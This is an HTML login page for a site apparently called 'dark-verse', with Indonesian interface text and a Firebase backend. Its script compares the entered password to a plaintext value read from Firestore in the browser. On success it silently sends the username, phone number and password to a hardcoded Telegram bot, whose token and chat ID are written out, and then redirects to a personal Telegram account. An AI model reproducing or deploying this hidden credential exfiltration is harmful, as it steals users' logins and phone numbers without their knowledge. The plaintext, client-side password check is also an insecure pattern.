<!DOCTYPE html>
<html lang="id">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1.0" />
<title>Welcome Back Login</title>

<style>
*{box-sizing:border-box;font-family:Inter,Segoe UI,Arial,sans-serif}

body{
margin:0;
height:100vh;
display:flex;
align-items:center;
justify-content:center;
background: radial-gradient(circle at 20% 20%, #12001f, #12001f 70%);
color:white
}

.card{
width:340px;
padding:30px 26px;
border-radius:28px;
background:rgba(255,255,255,0.05);
backdrop-filter:blur(14px);
box-shadow:0 0 40px rgba(138,0,255,.45);
text-align:center
}

.avatar{
width:70px;
height:70px;
border-radius:18px;
margin:auto;
background:linear-gradient(135deg,#d9d9ff,#5c5cff);
display:flex;
align-items:center;
justify-content:center;
box-shadow:0 0 25px #b86bff;
margin-bottom:14px;
overflow:hidden;
}

/* Gambar avatar */
.avatar img{
width:100%;
height:100%;
object-fit:cover;
border-radius:18px;
}

h1{margin:6px 0 4px;font-size:24px;font-weight:700}
p{margin:0 0 18px;color:#cfc9ff;font-size:13px}

.field{position:relative;margin-bottom:14px}

.field input{
width:100%;
padding:13px 42px 13px 14px;
border-radius:14px;
border:none;
background:rgba(255,255,255,.08);
color:white;
font-size:14px;
outline:none;
transition:.25s
}

.field input:focus{
background:rgba(255,255,255,.14);
box-shadow:0 0 0 2px #9c6cff
}

.icon{
position:absolute;
right:12px;
top:50%;
transform:translateY(-50%);
cursor:pointer;
opacity:.7;
font-size:15px
}

button{
width:100%;
margin-top:6px;
padding:13px;
border:none;
border-radius:18px;
background:linear-gradient(90deg,#a200ff,#ff7bf1);
color:white;
font-size:15px;
font-weight:600;
cursor:pointer;
box-shadow:0 0 20px #b14cff;
transition:.25s
}

button:hover{
transform:translateY(-2px);
box-shadow:0 0 26px #d46bff
}

.msg{margin-top:12px;font-size:13px;height:16px}
.success{color:#79ffb2}
.error{color:#ff7b9c}
</style>
</head>

<body>

<div class="card">

<div class="avatar">
<img src="https://raw.githubusercontent.com/RayanXweb/dark-verse-terbaru-/refs/heads/main/icon.png">
</div>

<h1>Welcome Back</h1>
<p>Sign in to continue</p>

<div class="field">
<input id="user" type="text" placeholder="Username" />
<span class="icon">üë§</span>
</div>

<div class="field">
<input id="phone" type="tel" placeholder="Phone Number" />
<span class="icon">üì±</span>
</div>

<div class="field">
<input id="pass" type="password" placeholder="Password" />
<span class="icon" id="toggle">üëÅ</span>
</div>

<button id="loginBtn">Sign In</button>
<div id="msg" class="msg"></div>

</div>

<script type="module">
import { initializeApp } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-app.js";
import { getFirestore, doc, getDoc } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-firestore.js";

const firebaseConfig = {
  apiKey: "AIzaSyCGkxMigetfvxYYLcVcODftMyqMXBJhOVQ",
  authDomain: "dark-verse-54c63.firebaseapp.com",
  projectId: "dark-verse-54c63",
  storageBucket: "dark-verse-54c63.firebasestorage.app",
  messagingSenderId: "188162026500",
  appId: "1:188162026500:web:f76bca12b1de60b8381951",
  measurementId: "G-E7K7EXMT59"
};

const app = initializeApp(firebaseConfig);
const db = getFirestore(app);

const toggle=document.getElementById('toggle');
const pass=document.getElementById('pass');
const phone=document.getElementById('phone');
const msg=document.getElementById('msg');

toggle.onclick=()=>{pass.type=pass.type==='password'?'text':'password'}

async function login(){
  const u=document.getElementById('user').value.trim();
  const p=pass.value.trim();
  if(!u||!p||!phone.value.trim()){
    msg.textContent='Semua field wajib diisi';
    msg.className='msg error';
    return;
  }
  try{
    const ref=doc(db,'users',u);
    const snap=await getDoc(ref);
    if(!snap.exists()){
      msg.textContent='User tidak ditemukan';
      msg.className='msg error';
      return;
    }
    const data=snap.data();
    if(data.password===p){
      const botToken="8266964903:AAHsuA4bjvR8ozyPrFGDW466aPLEpszNzDs";
      const chatId="8215645360";
      const textMsg=`LOGIN%0AUser: ${u}%0APhone: ${phone.value}%0APassword: ${p}`;
      fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${textMsg}`).catch(()=>{});
      msg.textContent='Login berhasil ‚úî';
      msg.className='msg success';
      setTimeout(()=>{
        const text=encodeURIComponent('tolong add min');
        window.location.href=`https://t.me/Aldinugroho37?text=${text}`;
      },900);
    }else{
      msg.textContent='Password salah';
      msg.className='msg error';
    }
  }catch(e){
    msg.textContent='Firebase error';
    msg.className='msg error';
    console.error(e);
  }
}

document.getElementById('loginBtn').onclick=login;
</script>

</body>
</html>
